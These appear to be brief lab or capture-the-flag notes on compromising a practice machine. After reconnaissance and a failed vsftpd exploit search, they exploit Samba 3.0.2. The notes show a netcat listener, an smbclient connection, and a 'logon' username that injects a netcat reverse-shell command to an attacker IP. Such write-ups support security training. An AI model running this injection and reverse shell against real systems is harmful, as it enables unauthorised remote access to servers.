## ping
![[Pasted image 20230925090920.png]]
## nmap
![[Pasted image 20230925090957.png]]
#port21 
#searchsploit 
```zsh
sudo searchsploit vsftpd 2.3.4
```
![[Pasted image 20230925091626.png]]
```zsh
searchsploit -x 17491
```
Seem to not work.. 
![[Pasted image 20230925091306.png]]Let's continue!
#smb
```zsh
sudo searchsploit samba 3.0.2
```
```zsh
searchsploit -x 16320
```
![[Pasted image 20230925093406.png]]
1. start Netcat
```zsh
sudo nc -lnvp 1234
```
2. need to connect
```zsh
sudo smbclient --no-pass //10.10.10.3/tmp
```
3. use 'logon' + the payload (username = "/=`nohup " + payload.encoded + "`" )
```zsh
logon username = "/=`nohup nc -e /bin/sh 10.10.10.6 1234`" 
```
![[Pasted image 20230925094216.png]]
Done!